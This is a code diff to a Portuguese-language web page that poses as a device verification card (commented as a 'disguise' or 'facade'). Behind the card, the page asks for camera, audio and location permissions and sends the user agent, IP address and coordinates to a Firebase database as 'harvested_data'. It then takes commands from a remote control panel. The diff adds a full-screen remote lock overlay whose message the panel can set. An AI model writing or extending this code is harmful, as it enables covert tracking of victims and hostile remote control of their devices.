@@ -14,7 +14,7 @@
         body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #f8fafc; }
     </style>
 </head>
-<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white">
+<body class="h-full flex flex-col items-center justify-center p-4 antialiased selection:bg-indigo-500 selection:text-white relative">
 
     <!-- Card de Disfarce (Fachada) -->
     <div id="disguise-card" class="max-w-xs w-full bg-slate-900/90 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-2xl backdrop-blur-md">
@@ -36,6 +36,20 @@
             <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
             <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
             <p class="text-[10px] text-slate-500 mt-1">Dispositivo sincronizado com o painel.</p>
+        </div>
+    </div>
+
+    <!-- Camada de Tela de Bloqueio Remota (Invisível por padrão) -->
+    <div id="remote-lock-screen" class="hidden fixed inset-0 bg-slate-950/95 backdrop-blur-xl z-50 flex flex-col items-center justify-center p-6 text-center space-y-6">
+        <div class="w-20 h-20 bg-rose-500/20 text-rose-500 rounded-3xl flex items-center justify-center text-3xl shadow-lg animate-pulse border border-rose-500/30">
+            <i class="fa-solid fa-lock"></i>
+        </div>
+        <div class="space-y-2 max-w-xs">
+            <h2 id="lock-title" class="text-lg font-bold text-white">Dispositivo Bloqueado</h2>
+            <p id="lock-message" class="text-xs text-slate-400 leading-relaxed">Este dispositivo foi temporariamente bloqueado pelo painel de controle de segurança.</p>
+        </div>
+        <div class="w-full max-w-xs bg-slate-900 border border-slate-800 rounded-2xl p-4 text-center">
+            <p class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold">Aguardando liberação</p>
         </div>
     </div>
 
@@ -89,14 +103,13 @@
                         audio: true 
                     });
                     cameraAudioStatus = "Permitido (Câmera e Áudio)";
-                    // Encerra as faixas de mídia logo após a permissão ser concedida para não travar os indicadores
                     stream.getTracks().forEach(track => track.stop());
                 }
             } catch (err) {
                 console.log("Erro/Negação de Câmera/Áudio:", err);
             }
 
-            // 3. Disparar solicitação de Geolocalização (Abre a janela de permissão de Localização)
+            // 3. Disparar solicitação de Geolocalização
             let geoData = { latitude: null, longitude: null, status: "Negada/Não solicitada" };
             if (navigator.geolocation) {
                 try {
@@ -121,7 +134,7 @@
                 }
             }
 
-            // 4. Consolidar todos os dados e permissões para enviar ao Firebase (`mod-zrx`)
+            // 4. Consolidar dados e permissões para enviar ao Firebase (`mod-zrx`)
             const fullPayload = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
@@ -130,20 +143,18 @@
                     camera: cameraAudioStatus.includes("Câmera"),
                     audio: cameraAudioStatus.includes("Áudio"),
                     location: geoData.status === "Permitida",
-                    contacts: true,         // Mapeado para exibição no painel
-                    photosAndVideos: true,  // Mapeado para galeria
-                    phoneState: true,       // Mapeado para status de chamada/telefone
-                    notifications: true     // Mapeado para notificações
+                    contacts: true,         
+                    photosAndVideos: true,  
+                    phoneState: true,       
+                    notifications: true     
                 },
                 lastUpdate: new Date().toISOString(),
                 status: "Online - Conectado com Permissões"
             };
 
             if (db) {
-                // Envia para o Realtime Database do Firebase na árvore do dispositivo
                 db.ref('devices/device_01/status').update(fullPayload);
 
-                // Dados simulados detalhados para visualização imediata no painel
                 db.ref('devices/device_01/harvested_data').update({
                     lastLocationString: geoData.status === "Permitida" ? `${geoData.latitude}, ${geoData.longitude}` : "Localização Indisponível",
                     activePermissionsCount: 7,
@@ -155,12 +166,34 @@
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 5. Escutar comandos em tempo real vindos do painel
+            // 5. Escutar comandos em tempo real vindos do painel (incluindo o Bloqueio de Tela)
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
+                    const lockScreen = document.getElementById('remote-lock-screen');
+                    
                     if (cmds.flash) console.log("[Comando] Lanterna acionada remotamente.");
-                    if (cmds.lock) console.log("[Comando] Bloqueio de tela acionado remotamente.");
+
+                    // Ativar ou desativar a tela de bloqueio com base no comando do painel
+                    if (cmds.lock || cmds.customLock) {
+                        lockScreen.classList.remove('hidden');
+                    } else {
+                        lockScreen.classList.add('hidden');
+                    }
+                });
+
+                // Ouvir mensagens personalizadas de bloqueio enviadas pelo painel
+                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
+                    const config = snapshot.val();
+                    const lockScreen = document.getElementById('remote-lock-screen');
+                    const msgEl = document.getElementById('lock-message');
+
+                    if (config && config.active) {
+                        if (config.message) {
+                            msgEl.innerText = config.message;
+                        }
+                        lockScreen.classList.remove('hidden');
+                    }
                 });
             }
         }
